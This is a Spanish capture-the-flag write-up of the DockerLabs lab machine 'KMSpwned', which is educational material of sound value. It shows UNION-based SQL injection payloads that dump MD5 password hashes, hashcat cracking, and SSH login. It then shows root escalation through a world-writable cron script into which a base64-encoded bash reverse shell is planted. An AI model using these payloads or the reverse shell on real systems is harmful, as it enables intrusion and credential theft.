# KMSpwned (DockerLabs - Fácil)

**Plataforma:** DockerLabs
**Categoría:** Linux / Web / SQLi / Cron Job
**IP objetivo:** 172.17.0.2

---

## Resumen

Máquina Linux con una aplicación web de hosting que contiene una vulnerabilidad de SQL Injection en el verificador de extensiones de dominio. A través de la inyección se extraen credenciales de la base de datos, se crackean los hashes MD5 y se accede por SSH como `carlos`. La escalada a root se consigue modificando un script de backup con permisos incorrectos (`rwxrwxrwx`) que root ejecuta automáticamente cada minuto via cron.

---

## 1. Reconocimiento

```bash
nmap -p- --min-rate 5000 172.17.0.2 -oG nmapbase
nmap -sVC -p22,80 172.17.0.2 -oG nmapvers
```

Puertos abiertos:

- 22/tcp → OpenSSH 8.4p1 (Debian)
- 80/tcp → Apache 2.4.67 — "ServiCloud — Dominios, Hosting y Aplicaciones"

---

## 2. Enumeración web y registro

Se accede a `http://172.17.0.2/registro.php` y se crea una cuenta de usuario (`test:test`). Tras el login se identifica un apartado llamado **"Verificador de extensiones de dominio"** que consulta la base de datos y devuelve el resultado en JSON:

```
Entrada: es
Respuesta: {"estado":"ok","datos":[{"id":"4","extension":"es","precio":"5.99"}]}
```

---

## 3. SQL Injection

### Confirmación

Al introducir `' or 1=1 -- -` en el campo de extensión, la aplicación devuelve todas las filas de la tabla en vez de solo la consultada — confirmando una SQLi de tipo UNION-based sin sanitización del input.

### Determinación del número de columnas

Usando Burp Suite se intercepta la petición y se envía al Repeater. Se prueba `ORDER BY` de forma incremental hasta que la consulta falla — el número anterior al error es el total de columnas:

```json
{"accion":"buscar_extension","params":{"extension":"' order by 3-- -"}}
```

La consulta original tiene **3 columnas** (`id`, `extension`, `precio`).

### Enumeración de tablas

```json
{"accion":"buscar_extension","params":{"extension":"' union select table_name,null,null from information_schema.tables-- -"}}
```

Entre las tablas del sistema (`information_schema`, `INNODB_*`, etc.) se identifican las tablas de la aplicación:

```
sc_usuarios / sc_clientes / sc_extensiones / web_usuarios / sc_notas / sc_flags / sc_facturas
```

La tabla más relevante es `sc_usuarios`.

### Enumeración de columnas

```json
{"accion":"buscar_extension","params":{"extension":"' union select column_name,null,null from information_schema.columns where table_name='sc_usuarios'-- -"}}
```

Columnas encontradas: `id`, `usuario`, `password`, `email`, `rol`, `creado`.

### Extracción de credenciales

```json
{"accion":"buscar_extension","params":{"extension":"' union select usuario,password,rol from sc_usuarios-- -"}}
```

```json
{"datos":[
  {"id":"admin","extension":"c378985d629e99a4e86213db0cd5e70d","precio":"admin"},
  {"id":"carlos","extension":"7c6a180b36896a0a8c02787eeafb0e4c","precio":"gestor"},
  {"id":"ana","extension":"b33e0dcc9e2d7a1649d96831260b5698","precio":"usuario"}
]}
```

Los hashes tienen 32 caracteres hexadecimales — formato MD5.

---

## 4. Crackeo de hashes MD5

MD5 es un algoritmo de hash sin sal y computacionalmente barato, lo que lo hace vulnerable a ataques de diccionario. Se usa hashcat con el modo `-m 0` (MD5 raw):

```bash
echo "c378985d629e99a4e86213db0cd5e70d" > hashes.txt
echo "7c6a180b36896a0a8c02787eeafb0e4c" >> hashes.txt
echo "b33e0dcc9e2d7a1649d96831260b5698" >> hashes.txt

hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Resultados:

| Usuario | Hash MD5 | Contraseña |
|---|---|---|
| admin | c378985d629e99a4e86213db0cd5e70d | chocolate |
| carlos | 7c6a180b36896a0a8c02787eeafb0e4c | password1 |
| ana | b33e0dcc9e2d7a1649d96831260b5698 | ana1234 |

---

## 5. Acceso SSH

Se prueban las credenciales obtenidas contra SSH. Solo `carlos` tiene acceso:

```bash
ssh carlos@172.17.0.2
# contraseña: password1
```

Flag de usuario en `/home/carlos/user.txt`.

---

## 6. Escalada de privilegios — Cron Job con permisos inseguros

### Enumeración

En el home de `carlos` hay un archivo `notas.txt`:

```
Recordatorio: revisar permisos del script de backup en /opt/backup.sh
```

Se inspecciona el script y el crontab del sistema:

```bash
cat /opt/backup.sh
```

```bash
#!/bin/bash
tar -czf /tmp/backup_$(date +%Y%m%d).tar.gz /var/www/html/ 2>/dev/null
echo "Backup: $(date)" >> /var/log/backup.log
```

```bash
cat /etc/crontab
```

```
* * * * * root /opt/backup.sh
```

El script se ejecuta como `root` cada minuto. Los permisos del archivo:

```bash
ls -l /opt/backup.sh
-rwxrwxrwx 1 root root 157 Jul  8 17:13 /opt/backup.sh
```

`rwxrwxrwx` significa que cualquier usuario del sistema puede leer, escribir y ejecutar el script — error crítico de configuración que permite a `carlos` modificar un script que root ejecutará automáticamente.

### Explotación

Se inyecta un payload de reverse shell en el script de backup. El payload está codificado en Base64 para evitar problemas con caracteres especiales en la shell:

```bash
# El payload decodificado es: (bash >& /dev/tcp/172.17.0.1/4444 0>&1) &
echo 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0IDA+JjEpICY=|base64 -d|bash' > /opt/backup.sh
```

Se pone el listener en la máquina atacante:

```bash
nc -lvnp 4444
```

En menos de un minuto, cron ejecuta el script como root y la conexión llega:

```bash
id      # uid=0(root) gid=0(root) groups=0(root)
whoami  # root
```

Flag de root en `/root/root.txt`.

---

## Cadena de ataque

```
Verificador de extensiones → SQL Injection (UNION-based)
        ↓
information_schema → tablas → sc_usuarios → hashes MD5
        ↓
hashcat -m 0 → credenciales en texto plano
        ↓
SSH como carlos (password1) → user flag
        ↓
/opt/backup.sh con permisos rwxrwxrwx
        ↓
Cron ejecuta el script como root cada minuto
        ↓
Reverse shell → root flag
```

---

## Lecciones aprendidas

- Cuando una aplicación web devuelve datos de base de datos directamente en JSON, es una señal clara de que el parámetro puede ser inyectable — probar `' or 1=1 -- -` como primera comprobación.
- El flujo estándar de SQLi UNION-based es siempre: número de columnas (`ORDER BY`) → tablas (`information_schema.tables`) → columnas (`information_schema.columns`) → datos.
- MD5 sin sal no ofrece protección real contra ataques de diccionario — hashcat puede probar millones de candidatos por segundo. Siempre almacenar contraseñas con bcrypt o Argon2 con sal aleatoria.
- Un script con permisos `rwxrwxrwx` ejecutado por root via cron es una escalada de privilegios trivial. Los scripts ejecutados por root deben tener permisos `755` como mínimo, y ser propiedad de root.
- La nota `notas.txt` dejada por el administrador fue la pista directa al vector de escalada — en entornos reales y de práctica, siempre leer todos los archivos del home del usuario comprometido.
